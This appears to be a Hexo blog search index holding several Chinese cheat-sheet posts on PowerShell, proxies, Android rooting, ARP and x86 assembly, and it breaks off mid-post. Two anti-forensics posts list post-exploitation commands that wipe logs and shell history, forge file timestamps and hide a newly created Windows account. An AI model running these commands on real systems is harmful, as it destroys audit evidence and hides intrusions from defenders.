<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>802.11 协议分析</title>
    <url>/2018/05/11/80211/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>关于 PowerShell</title>
    <url>/2018/07/16/about-powershell/</url>
    <content><![CDATA[<p>PowerShell 是微软用来取代 CMD 的一个强大的 Shell。</p>
<h2 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h2><p>在不同版本的 Windows 中已经内置了不同版本的 PowerShell，常见情况如下：</p>
<ul>
<li>Windows XP SP2 / Server 2003 SP1：PowerShell 1.0</li>
<li>Windows 7 / Server 2008：PowerShell 2.0，此版本包含了 PowerShell ISE，即 Integrated Scripting Environment（集成的脚本环境），更方便的编写 PowerShell 脚本。</li>
<li>Windows 8 / Server 2012：PowerShell 3.0，从此版本开始，PowerShell 被集成进了 WMF 中，即 Windows Management Framework（Windows 管理框架）。</li>
<li>Windows 8.1 / Server 2012 R2：PowerShell 4.0</li>
<li>Windows 10：PowerShell 5.0，此版本的 WMF 包含了 PowerShellGet，可用于在线下载、安装模块。</li>
</ul>
<span id="more"></span>
<h2 id="优势及劣势"><a href="#优势及劣势" class="headerlink" title="优势及劣势"></a>优势及劣势</h2><p>PowerShell 相较于 CMD 的优势是不言而喻的，相较于 Unix 中的 Shell，它的优势主要体现在两方面：面向对象特性以及与 .NET 的深度结合。</p>
<p>劣势当然也有，相较于 CMD，至今为止它的启动速度仍然较慢，相较于 Unix 中的 Shell，它的生态环境还欠火候，可以期待未来有更多的人关注到 PowerShell。</p>
<h2 id="Cmdlets-与-pipeline"><a href="#Cmdlets-与-pipeline" class="headerlink" title="Cmdlets 与 pipeline"></a>Cmdlets 与 pipeline</h2><p>Cmdlets 与 pipeline 是 PowerShell 中的两个核心概念，</p>
<h2 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h2><p>PowerShell 中的大多数常用命令都有对应于 Linux 中相关命令的别名，比如 <code>ls</code>、<code>mv</code>、<code>ps</code>、<code>cat</code>、<code>kill</code>、<code>wget</code>、<code>clear</code> 等，下面介绍的命令为 PowerShell 所不同于 Linux 中的命令。</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看PowerShell版本信息</span></span><br><span class="line">Get-Host</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看帮助信息</span></span><br><span class="line"><span class="built_in">help</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看所有已经设置的别名</span></span><br><span class="line">Get-Alias</span><br><span class="line"></span><br><span class="line"><span class="comment"># 从powershellgallery.com下载安装第三方模块</span></span><br><span class="line">Install-Module</span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入模块，安装的模块需要先导入才能使用</span></span><br><span class="line">Import-Module</span><br><span class="line"></span><br><span class="line"><span class="comment"># 卸载模块</span></span><br><span class="line">Uninstall-Module</span><br><span class="line"></span><br><span class="line"><span class="comment"># 更新模块</span></span><br><span class="line">Update-Module</span><br><span class="line"></span><br><span class="line"><span class="comment"># 列出已安装模块</span></span><br><span class="line">Get-InstalledModule</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看PowerShellGet模块有哪些命令</span></span><br><span class="line">Get-Command -Module PowerShellGet</span><br><span class="line"></span><br><span class="line"><span class="comment"># 升级帮助手册</span></span><br><span class="line">Update-Help</span><br></pre></td></tr></table></figure>

<h2 id="常用模块"><a href="#常用模块" class="headerlink" title="常用模块"></a>常用模块</h2><ul>
<li><a href="https://github.com/dahlbyk/posh-git">posh-git</a>：PowerShell 中的 Git 增强模块</li>
<li><a href="https://github.com/JanDeDobbeleer/oh-my-posh">oh-my-posh</a>：类似于 oh-my-zsh</li>
<li><a href="https://github.com/webmd-health-services/Carbon">Carbon</a>：一系列有用的工具集</li>
<li><a href="https://github.com/lzybkr/PSReadLine">PSReadline</a>：一个增强的命令行编辑模块</li>
<li><a href="https://github.com/JulianChow94/Windows-screenFetch">windows-screenfetch</a>：Windows 下的 screenfetch 模块</li>
</ul>
<h2 id="Microsoft-PowerShell-profile-ps1"><a href="#Microsoft-PowerShell-profile-ps1" class="headerlink" title="Microsoft.PowerShell_profile.ps1"></a>Microsoft.PowerShell_profile.ps1</h2><p>和一般的 Linux 中的 Shell 一样，PowerShell 也有一个配置文件，即 <code>Microsoft.PowerShell_profile.ps1</code>，当 PowerShell 运行时会默认加载此配置文件中的设置。一般而言，用户级别的配置文件位于 <code>%HOMEPATH%\Documents\WindowsPowerShell</code> 下，当然，你也可以使用 <code>echo $profile</code>命令查看具体的位置。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>关于代理那些事</title>
    <url>/2018/07/26/about-proxy/</url>
    <content><![CDATA[<h2 id="正向连接与反向连接"><a href="#正向连接与反向连接" class="headerlink" title="正向连接与反向连接"></a>正向连接与反向连接</h2><p><strong>正向连接</strong>即黑客主动连接受害者，这种情况下要求受害者有公网IP，常用于对服务器的渗透；<strong>反向连接</strong>即受害者主动连接黑客，这种情况下要求黑客有公网IP，常用于对个人的渗透。</p>
<h2 id="正向代理与反向代理"><a href="#正向代理与反向代理" class="headerlink" title="正向代理与反向代理"></a>正向代理与反向代理</h2><p>在英语中，<strong>Proxy</strong>表示<strong>服务器代理</strong>这种动作，而<strong>Agent</strong>表示<strong>代理服务器</strong>这种物质，显然，我们这里讨论的是Proxy这种动作，而非代理服务器本身。<br>不论正向还是反向，代理都是基于这样一个事实：即A与B的通信要经过C的转发，这里的C就是Agent，为了方便讨论，我们将A视为客户端，将B视为服务器端。<br><strong>正向代理</strong>(Forward Proxy)：也就是常说的代理，代理服务器偏向于客户端，服务器端只能得到代理服务器的IP地址，隐藏了客户端的IP地址。常用于科学上网工具。<br><strong>反向代理</strong>(Reverse Proxy)：代理服务器偏向于服务器端，客户端只能得到代理服务器的IP地址，隐藏了服务器端的IP地址。常用于网站镜像等。</p>
<span id="more"></span>

<h2 id="端口转发与端口映射"><a href="#端口转发与端口映射" class="headerlink" title="端口转发与端口映射"></a>端口转发与端口映射</h2><p>传统意义上，我们认为<strong>端口转发</strong>(Port Forwarding)与<strong>端口映射</strong>(Port Mapping)表达同样的内容。顾名思义，端口转发指的是将某个IP的某个端口转发到另一个IP的另一个端口，这样，可以通过访问后者以达到访问前者的目的。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>关于 Windows 的代理设置</title>
    <url>/2019/07/29/about-the-proxy-settings-for-windows/</url>
    <content><![CDATA[<p>Windows 的<strong>系统代理</strong>使用的其实是 <strong>IE 的代理设置</strong>，此外，对于<strong>绝大多数</strong>的应用程序而言，它们默认使用的也是 IE 的代理设置，比如，Chrome、Firefox、Microsoft Store 等。因此，如果想让绝大多数的应用程序使用代理，一个简单的方法是直接设置 IE 的代理（即系统代理）。不过，对于一小部分没有使用 IE 代理设置的应用程序，比如 Android Studio 等，你可能需要单独设置它们的代理（一般在软件的设置项中）。</p>
<p>值得注意的是，同为应用程序的 <strong>Shell</strong>（包括<strong>命令提示符</strong>和 <strong>PowerShell</strong>）就没有使用 IE 的代理设置，它们各自有自己的代理设置。具体而言，要为命令提示符设置代理，可使用如下两条命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> HTTP_PROXY=http://user:password@proxy.domain.com:port</span><br><span class="line"><span class="built_in">set</span> HTTPS_PROXY=https://user:password@proxy.domain.com:port</span><br></pre></td></tr></table></figure>

<p>而要为 PowerShell 设置代理则要使用<a href="todo">这个脚本</a>。</p>
<p>对于 Shell 中运行的程序，有一部分使用的是 IE 的代理设置，比如 <code>pip</code>、<code>npm</code> 等，另一部分则使用的是 Shell 的代理设置，比如 <code>curl</code>、<code>gem</code> 等。</p>
<p>此外，有一些程序的代理设置相对比较复杂，比如 <a href="/2018/08/31/git/" title="git">git</a>、<a href="/2018/08/31/docker/" title="docker">docker</a> 等，详见它们各自的介绍文章。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>ADB小记</title>
    <url>/2019/07/29/adb/</url>
    <content><![CDATA[<h2 id="相关问题"><a href="#相关问题" class="headerlink" title="相关问题"></a>相关问题</h2><h3 id="error-device-still-connecting"><a href="#error-device-still-connecting" class="headerlink" title="error: device still connecting"></a>error: device still connecting</h3><p>输入<code>adb shell</code>时显示<code>error: device still connecting</code>，一般可通过：关闭<strong>开发者模式</strong>然后重新打开<strong>开发者模式</strong>，接着开启<strong>USB调试</strong>并重新和电脑配对，即可解决。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>高级搜索技巧</title>
    <url>/2018/11/20/advanced-search-tips/</url>
    <content><![CDATA[]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
  </entry>
  <entry>
    <title>Android Studio模拟器相关问题解决</title>
    <url>/2018/08/21/android-emulator-problem/</url>
    <content><![CDATA[<h2 id="网络问题"><a href="#网络问题" class="headerlink" title="网络问题"></a>网络问题</h2><span id="more"></span>
<h2 id="命令行启动"><a href="#命令行启动" class="headerlink" title="命令行启动"></a>命令行启动</h2><p>Android SDK工具包中包含着一个模拟器的命令行程序 —— <code>emulator</code>，它可以在不启动Android Studio的情况下开启Android模拟器，在Windows系统中，<code>emulator</code>位于<code>%LOCALAPPDATA%\Android\Sdk\tools</code>文件夹下，<code>emulator -list-avds</code>命令可以列出所有已创建的AVD，<code>emulator -avd &lt;avd-name&gt;</code>命令即可启动相应的AVD，要查看<code>emulator</code>更多的参数，可以使用<code>emulator -help</code>。</p>
<h2 id="最佳实践"><a href="#最佳实践" class="headerlink" title="最佳实践"></a>最佳实践</h2><p>建议创建的AVD为Pixel，版本为Android 7.1.1。</p>
]]></content>
      <categories>
        <category>Bug</category>
      </categories>
  </entry>
  <entry>
    <title>谈谈Android的root</title>
    <url>/2018/09/18/android-root/</url>
    <content><![CDATA[<p>Android的内核是Linux，所以Android的root和Linux的root有些许关系，不妨先回顾一下Linux中是如何获取root的。</p>
<h2 id="Linux相关"><a href="#Linux相关" class="headerlink" title="Linux相关"></a>Linux相关</h2><p>在Linux中获得root权限有2个命令，<code>su</code>与<code>sudo</code>，<code>sudo</code>只是为了短暂的获得root权限以执行某些操作(superuser do)，而<code>su</code>其实是为了切换用户(switch user)，但当其不带参数直接执行时，默认为切换到root用户。使用<code>sudo</code>执行某些需要root权限的操作时，需要输入当前用户的密码；而直接使用<code>su</code>切换到root用户时，需要输入root用户的密码。<br>在Linux中，文件的权限有<code>rwx</code>三种，即可读(read)、可写(write)、可执行(execute)，其中<code>r</code>又等于4，<code>w</code>等于2，<code>x</code>等于1。所以，如果一个文件同时具有<code>rwx</code>权限，那么它的权限位就等于7。</p>
<span id="more"></span>
<h2 id="Android相关"><a href="#Android相关" class="headerlink" title="Android相关"></a>Android相关</h2><p>Android本身是不愿意让用户获得root权限的，所以Android中没有<code>su</code>或<code>sudo</code>这些命令。所以，获得root权限的第一步就是要把<code>su</code>命令拷贝到Android的<code>/system/bin</code>或<code>/system/xbin</code>目录下。但是拷贝之后并不能直接使用<code>su</code>命令，因为Android中<code>su</code>的运行机制和Linux中不同。在Android中只有root用户才能使用<code>su</code>命令，非root用户无权使用<code>su</code>命令。这其实是一个逻辑闭环：使用<code>su</code>命令可以切换到root，但只有root用户才可以使用<code>su</code>命令。好在Linux中文件的权限除了<code>rwx</code>三种之外，还有<code>s</code>权限，<code>s</code>代表当任何一个用户执行该文件时都拥有文件所有者的权限，换句话来说，如果一个文件的所有者是root，且它的执行权限标志位是<code>s</code>，那么不管谁执行这个文件，他执行的时候都是以root身份执行的。<br>基于以上，Android获取root权限大致可以分为如下3步：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 拷贝su到指定目录下</span></span><br><span class="line">cp /data/tmp/su /system/bin/</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将su所有者设为root</span></span><br><span class="line">chown root:root su</span><br><span class="line"></span><br><span class="line"><span class="comment"># 将su标志位设为-rwsr-xr-x</span></span><br><span class="line">chmod 4775 /system/bin/su</span><br></pre></td></tr></table></figure>

<p>但是，除了上面第一步以外，剩下两步都需要root权限才能成功执行，这就又造成了一个逻辑闭环：即通过上面的代码可以获得root权限，但必须有root权限才能执行上面的代码。这时的解决办法就是寻找Android系统的漏洞，系统中有些进程是以root权限运行的，只有找出那些有漏洞的进程，然后利用缓冲区溢出让其执行我们上面的命令，即可完成root。<br>所以，总的来说，Android获取root权限最重要的一步，就是寻找系统的漏洞，然后利用之。</p>
<h2 id="术语"><a href="#术语" class="headerlink" title="术语"></a>术语</h2><p>了解了Android root的基本原理后，需要理清一些常用术语：</p>
<h3 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h3><h3 id="Bootloader"><a href="#Bootloader" class="headerlink" title="Bootloader"></a>Bootloader</h3><h3 id="线刷"><a href="#线刷" class="headerlink" title="线刷"></a>线刷</h3><h3 id="卡刷"><a href="#卡刷" class="headerlink" title="卡刷"></a>卡刷</h3><h2 id="Nexus的root"><a href="#Nexus的root" class="headerlink" title="Nexus的root"></a>Nexus的root</h2><p>Nexus系列作为Google的亲儿子，自然少不了root解决方案，目前root Nexus设备使用最多的软件是<a href="http://www.wugfresh.com/nrt/">Nexus Root Toolkit(NRT)</a>。请注意，此软件运行前会先进行更新，这会花费较长的时间，需要耐心等待。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>Android刷机指南</title>
    <url>/2019/03/23/android-shuaji-guide/</url>
    <content><![CDATA[<h2 id="名词解释"><a href="#名词解释" class="headerlink" title="名词解释"></a>名词解释</h2><h3 id="软重启与硬重启"><a href="#软重启与硬重启" class="headerlink" title="软重启与硬重启"></a>软重启与硬重启</h3><p><strong>软重启</strong>（又称<strong>热重启</strong>）是指从操作系统层面上关机再开机，而<strong>硬重启</strong>（又称<strong>冷重启</strong>）是指直接关掉电源再开机。类似的，也有<strong>软（热）关机</strong>和<strong>硬（冷）关机</strong>，其区别类似于在 Windows “开始”菜单中点击关机和直接关掉主机电源的区别。一般而言，软（热）关机对设备更好。</p>
<span id="more"></span>
<h3 id="Bootloader-fastboot-Recovery"><a href="#Bootloader-fastboot-Recovery" class="headerlink" title="Bootloader/fastboot/Recovery"></a>Bootloader/fastboot/Recovery</h3><h3 id="Full-OTA-Image-与-Factory-Image"><a href="#Full-OTA-Image-与-Factory-Image" class="headerlink" title="Full OTA Image 与 Factory Image"></a>Full OTA Image 与 Factory Image</h3><h2 id="刷机流程"><a href="#刷机流程" class="headerlink" title="刷机流程"></a>刷机流程</h2><ol>
<li>提前备份必要的数据（下载的音乐、视频，QQ、微信的聊天记录，通话记录、短信、通讯录，相册等），尽量保持电量满。</li>
<li>恢复出厂设置（亦或，取消所有安全机制，如屏幕锁定等，并退出 Google 账号。）。</li>
<li>在开发者选项中开启 USB 调试。</li>
<li>解锁 Bootloader（需要的话）。</li>
<li>刷入第三方 Recovery，如 <a href="https://twrp.me/">TWRP</a>。</li>
<li>从 TWRP 中安装第三方 ROM，顺便 root。</li>
</ol>
<h2 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h2><h3 id="开机无限进入-TWRP"><a href="#开机无限进入-TWRP" class="headerlink" title="开机无限进入 TWRP"></a>开机无限进入 TWRP</h3><p>碰到这种情况，你可能需要格式化 Data 分区。</p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>反取证之 Linux</title>
    <url>/2018/05/02/anti-forensics-linux/</url>
    <content><![CDATA[<p>后渗透测试阶段的重要工作便是擦除痕迹，也即<strong>反取证</strong>，文件系统访问都会留下痕迹，最好的避免计算机取证的方法就是不要碰文件系统，这也是 meterpreter 的先天优势，它完全基于内存，Linux 中的反取证主要涉及 MAC 时间、日志文件、history：</p>
<h2 id="MAC-时间"><a href="#MAC-时间" class="headerlink" title="MAC 时间"></a>MAC 时间</h2><p>MAC 即 Modified/Accessed/Changed，也就是修改/访问/更改时间，修改时间指对文件内容修改时的时间，访问时间指对文件内容访问时的时间（例如通过 <code>cat</code> 查看时），更改时间指对文件属性、权限更改时的时间。</p>
<p>使用 <code>ls -l</code> 默认查看的是修改时间，要查看其余 2 个时间，可以加参数 <code>ls -l --time=atime/ctime</code>，另一个查看 MAC 时间的命令是 <code>stat</code>。</p>
<p>使用 <code>touch -d &quot;5 days ago&quot;</code> 或 <code>touch -t 1805021030</code> 可以修改 MAC 中的 MA 时间。meterpreter 中的 <code>timestomp</code> 命令可以方便的修改 MAC 时间。</p>
<span id="more"></span>
<h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>清除相关日志文件</p>
<h3 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h3><p>Linux 中的日志文件主要有 <code>/var/log/auth.log</code>、<code>/var/log/secure</code>、<code>/var/log/wtmp</code>、<code>/var/log/btmp</code>、<code>/var/log/lastlog</code>、<code>/var/log/faillog</code>。</p>
<p>Debian 系的 <code>auth.log</code> 文件与 RedHat 系的 <code>secure</code> 文件都记录了系统的登录日志，<code>last</code> 命令用于查看登录日志以及重启日志，文件位于 <code>/var/log/wtmp</code>；<code>lastb</code> 命令用于查看登录失败日志，文件位于 <code>/var/log/btmp</code>；<code>lastlog</code> 命令用于查看所有用户最近一次登录日志，文件位于 <code>/var/log/lastlog</code>；<code>faillog</code> 命令与 <code>lastlog</code> 命令一样，用于查看用户登录失败日志，文件位于 <code>/var/log/faillog</code>，此命令仅限于 Debian 系。</p>
<h3 id="Web-日志"><a href="#Web-日志" class="headerlink" title="Web 日志"></a>Web 日志</h3><p>Apache 的日志文件位于 <code>/var/log/apache2</code>；Nginx 的日志文件位于 <code>/var/log/nginx</code>。</p>
<h2 id="history"><a href="#history" class="headerlink" title="history"></a>history</h2><p>Linux 中，每次输入的命令都会记录在用户文件夹中的 <code>.bash_history</code> 文件中，默认记录 1000 条命令，使用 <code>history</code> 命令即可查看，清除记录的方法是使用 <code>history -c</code> 命令。另一种清除记录的方法是更改 <code>.bash_history</code> 文件的属性，使用命令：<code>chattr +i .bash_history</code> 使其不可被更改，从而无法向其写入任何数据。</p>
<p><strong>最后，请不要忘记 HIDS/IPS/WAF/集中的日志服务器的痕迹擦除。</strong></p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>计算机取证</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title>反取证之 Windows</title>
    <url>/2018/05/02/anti-forensics-windows/</url>
    <content><![CDATA[<h2 id="MACE-时间"><a href="#MACE-时间" class="headerlink" title="MACE 时间"></a>MACE 时间</h2><p>和 <a href="/2018/05/02/anti-forensics-linux/" title="反取证之 Linux">反取证之 Linux</a> 中的一样，Windows 也有 MAC 时间，不过在 Windows 中，C 指的是 Created，即创建时间，Windows 中默认显示的是修改时间，另外，在 Windows 的 NTFS 文件系统中还有 E 时间，即 MFT entry，其中包含了文件的大量信息，包括大小、名称、目录位置、磁盘位置、创建日期等，在擦除痕迹时也要擦除 E 时间，同样，meterpreter 中的 <code>timestomp</code> 命令可以方便的修改 MACE 时间。</p>
<h2 id="隐藏新建账号"><a href="#隐藏新建账号" class="headerlink" title="隐藏新建账号"></a>隐藏新建账号</h2><p>当在目标系统上新建了用户账号后，通常会在登录界面上显示出来，要实现隐藏，可以修改注册表项，采用如下命令：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">REG ADD HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList /v uname /t REG_DWORD /d 0</span><br></pre></td></tr></table></figure>

<p>注意：这种隐藏只是在登录界面的隐藏，用户使用 <code>net user</code> 或“本地用户和组”仍然可以查到新建的账户。</p>
<h2 id="日志文件"><a href="#日志文件" class="headerlink" title="日志文件"></a>日志文件</h2><p>清除相关日志文件</p>
<h3 id="系统日志"><a href="#系统日志" class="headerlink" title="系统日志"></a>系统日志</h3><p>Windows 系统日志文件一般存放在 <code>Windows</code> 文件夹下，可以使用如下命令删除之：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">del %windir%\*.<span class="built_in">log</span> /a/s/q/f</span><br></pre></td></tr></table></figure>

<p>另外，meterpreter 中的 <code>clearev</code> 命令可以删除事件查看器中的日志信息。</p>
<h3 id="Web-日志"><a href="#Web-日志" class="headerlink" title="Web 日志"></a>Web 日志</h3><p>IIS 的日志文件位于 <code>%windir%\System32\LogFiles</code> 目录下。</p>
<p><strong>最后，请不要忘记 HIDS/IPS/WAF/集中的日志服务器的痕迹擦除。</strong></p>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>Windows</tag>
        <tag>渗透</tag>
        <tag>计算机取证</tag>
      </tags>
  </entry>
  <entry>
    <title>ARP 运行机制</title>
    <url>/2021/03/06/arp/</url>
    <content><![CDATA[<p>与 DNS 类似，<strong>ARP</strong>（Address Resolution Protocol，<strong>地址解析协议</strong>）提供了将 <strong>IP 地址</strong>转换为<strong>链路层地址</strong>的机制。这两种解析器之间的一个重要区别是，DNS 为在因特网中任何地方的主机解析主机名，而 ARP 只为在同一个子网上的主机和路由器<strong>接口</strong>解析 IP 地址。</p>
<span id="more"></span>

<h2 id="MAC-地址"><a href="#MAC-地址" class="headerlink" title="MAC 地址"></a>MAC 地址</h2><p>事实上，并不是主机或路由器具有链路层地址，而是它们的适配器（即网络接口）具有链路层地址。因此，具有多个网络接口的主机或路由器将具有与之相关联的多个链路层地址，就像它也具有与之相关联的多个 IP 地址一样。</p>
<p>链路层地址有各种不同的称呼：<strong>LAN 地址</strong>（LAN address）、<strong>物理地址</strong>（physical address）或 <strong>MAC 地址</strong>（MAC address）。我们一般将链路层地址称为 MAC 地址。</p>
<p>对于大多数局域网（包括以太网和 802.11 无线局域网）而言，MAC 地址长度为 6 字节，共有 $2^{48}$ 个可能的 MAC 地址。这些 6 个字节地址通常用十六进制表示法，地址的每个字节被表示为一对十六进制数。如 <code>1A-23-F9-CD-06-9B</code>。尽管 MAC 地址被设计为永久的，但用软件改变一块适配器的 MAC 地址现在是可能的。</p>
<p>没有两块适配器具有相同的 MAC 地址。IEEE 在管理着 MAC 地址空间。特别是，当一个公司要生产适配器时，它支付象征性的费用购买组成 $2^{24}$ 个地址的一块地址空间。IEEE 分配这块 $2^{24}$ 个地址的方式是：固定一个 MAC 地址的前 24 比特，让公司自己为每个适配器生成后 24 比特的唯一组合。具体的分配列表可参考<a href="http://standards-oui.ieee.org/oui/oui.txt">其官网</a>。</p>
<p>适配器的 MAC 地址具有<strong>扁平结构</strong>（这与层次结构相反），而且不论适配器到哪里用都不会变化。与之形成对照的是，IP 地址具有<strong>层次结构</strong>（即一个网络部分和一个主机部分），而且当主机移动时，主机的 IP 地址需要改变，即改变它所连接到的网络。可以将适配器的 MAC 地址比喻成一个人的身份证号，而将 IP 地址比喻成一个人的住址。</p>
<p>当某适配器要向某些目的适配器发送一个帧时，发送适配器将目的适配器的 MAC 地址插入到该帧中，并将该帧发送到局域网上。对于使用 6 字节地址的局域网（例如以太网和 802.11）来说，<strong>MAC 广播地址</strong>（broadcast address）是 48 个连续的 1 组成的字符串（即以十六进制表示法表示的 <code>FF-FF-FF-FF-FF-FF</code>）。</p>
<h2 id="ARP-工作过程"><a href="#ARP-工作过程" class="headerlink" title="ARP 工作过程"></a>ARP 工作过程</h2><p>每台主机或路由器在其内存中具有一个 <strong>ARP 表</strong>（ARP table），这张表包含 IP 地址到 MAC 地址的映射关系。例如：</p>
<table>
<thead>
<tr>
<th>IP 地址</th>
<th>MAC 地址</th>
<th>TTL</th>
</tr>
</thead>
<tbody><tr>
<td>222.222.222.221</td>
<td>88-B2-2F-54-1A-0F</td>
<td>13:45:00</td>
</tr>
<tr>
<td>222.222.222.223</td>
<td>5C-66-AB-90-75-B1</td>
<td>13:52:00</td>
</tr>
</tbody></table>
<p>该 ARP 表也包含一个寿命（TTL）值，它指示了从表中删除每个映射的时间。注意到这张表不必为该子网中的每台主机和路由器都包含一个表项；某些可能从来没有进入到该表中，某些可能已经过期。从一个表项放置到某 ARP 表中开始，一个表项通常的过期时间是 20 分钟。</p>
<p>如果 ARP 表中当前没有目的主机的表项，在这种情况下，发送方用 ARP 协议来解析这个地址。首先，发送方构造一个称为 <strong>ARP 分组</strong>（ARP packet）的特殊分组。一个 ARP 分组有几个字段，包括发送和接收 IP 地址及 MAC 地址。ARP 查询分组和响应分组都具有相同的格式。ARP 查询分组的目的是询问子网上所有其他主机和路由器，以确定对应于要解析的 IP 地址的那个 MAC 地址。</p>
<p>查询 ARP 报文是在广播帧中发送的，而响应 ARP 报文在一个标准帧中发送。</p>
<p>ARP 表是即插即用的，这就是说，一个 ARP 表是自动建立的，即它不需要系统管理员来配置。并且如果某主机与子网断开连接，它的表项最终会从留在子网中的节点的表中删除。</p>
<h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>ARP 是一个链路层协议还是一个网络层协议？一个 ARP 分组封装在链路层帧中，因而在体系结构上位于链路层之上。然而，一个 ARP 分组具有包含链路层地址的字段，因而可认为是链路层协议，但它也包含网络层地址，因而也可认为是网络层协议。所以，可能最好把 ARP 看成是跨越链路层和网络层边界两边的协议，即不完全符合简单的分层协议栈。现实世界协议就是这样复杂！</p>
<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ol>
<li><a href="https://book.douban.com/subject/30280001/">James F. Kurose,Keith W. Ross.计算机网络：自顶向下方法[M].北京:机械工业出版社,2018:303-308.</a></li>
</ol>
]]></content>
      <categories>
        <category>CheatSheet</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
      </tags>
  </entry>
  <entry>
    <title>汇编语言小记</title>
    <url>/2019/03/09/assembly/</url>
    <content><![CDATA[<p><strong>汇编语言</strong>（Assembly Language，简称 <strong>ASM</strong>）由<strong>汇编指令</strong>、<strong>伪指令</strong>和<strong>其他符号</strong>组成，其中汇编指令有对应的机器码，而伪指令和其他符号没有对应的机器码，仅由汇编器识别执行。</p>
<h2 id="架构"><a href="#架构" class="headerlink" title="架构"></a>架构</h2><p>汇编语言是依赖底层 CPU 架构的，不同的 CPU 架构拥有不同的汇编语言，比如，常用于 PC 的<strong>x86 汇编</strong>和常用于嵌入式设备的<strong>ARM 汇编</strong>。由于 x86 架构又分为 16 位、32 位、64 位等，其相应的汇编也有稍许不同。本文主要以 32 位 x86 汇编为例做简要介绍。</p>
<span id="more"></span>
<h2 id="寄存器"><a href="#寄存器" class="headerlink" title="寄存器"></a>寄存器</h2><p>汇编语言的大部分指令都是直接操作 CPU 中的寄存器的，所以有必要了解以下 x86 架构的 CPU 中常见的寄存器。</p>
<p>16 位 x86 CPU 中常见的寄存器有：</p>
<ul>
<li>通用寄存器（<strong>8 个</strong>）：<ul>
<li>数据寄存器：<ul>
<li>AX：累加寄存器，Accumulator</li>
<li>BX：基址寄存器，Base</li>
<li>CX：计数寄存器，Count</li>
<li>DX：数据寄存器，Data</li>
</ul>
</li>
<li>指针寄存器：<ul>
<li>SP：堆栈指针寄存器，Stack Pointer</li>
<li>BP：基址指针寄存器，Base Pointer</li>
</ul>
</li>
<li>变址寄存器：<ul>
<li>SI：源变址寄存器，Source Index</li>
<li>DI：目的变址寄存器，Destinatin Index</li>
</ul>
</li>
</ul>
</li>
<li>段寄存器：<ul>
<li>CS：代码段寄存器，Code Segment</li>
<li>DS：数据段寄存器，Data Segment</li>
<li>SS：堆栈段寄存器，Stack Segment</li>
<li>ES：附加段寄存器，Extra Segment</li>
</ul>
</li>
<li>控制寄存器：<ul>
<li>IP：指令指针寄存器，Instruction Pointer</li>
<li>FLAGS：标志寄存器</li>
</ul>
</li>
</ul>
<p>为了保证兼容性，AX、BX、CX、DX 这四个寄存器都可分为两个可独立使用的 8 位寄存器来用，如 AX 可分为 <strong>AH</strong> 和 <strong>AL</strong>，其中 AH 代表高（High）8 位，AL 代表低（Low）8 位，其他 3 个也是如此。</p>
<p>32 位 x86 CPU 在 16 位的基础上增加了一些寄存器，那些和原来作用相同的寄存器一般会在前面加上 <code>E</code>，其中常见的寄存器有：</p>
<ul>
<li>通用寄存器（<strong>8 个</strong>）：EAX、EBX、ECX、EDX、ESP、EBP、ESI、EDI</li>
<li>段寄存器：CS、DS、SS、ES、FS、GS，增加的 FS、GS 和 ES 一样，属于附加段寄存器</li>
<li>指令指针寄存器：EIP</li>
<li>标志寄存器：EFLAGS</li>
<li>系统表寄存器：GDTR、LDTR、IDTR、TR</li>
<li>控制寄存器：CR0、CR1、CR2、CR3、CR4</li>
<li>调试寄存器：DR0、DR1、DR2、DR3、DR4、DR5、DR6、DR7</li>
<li>测试寄存器：TR0、TR1、TR2、TR3、TR4、TR5、TR6、TR7</li>
</ul>
<p>类似的，64 位又在 32 位的基础上增加了一些寄存器，那些和原来作用相同的寄存器一般会将前面的 <code>E</code> 改为 <code>R</code>，其中常见的寄存器有：</p>
<ul>
<li>通用寄存器（<strong>16 个</strong>）：RAX、RBX、RCX、RDX、RSP、RBP、RSI、RDI、R8、R9、R10、R11、R12、R13、R14、R15</li>
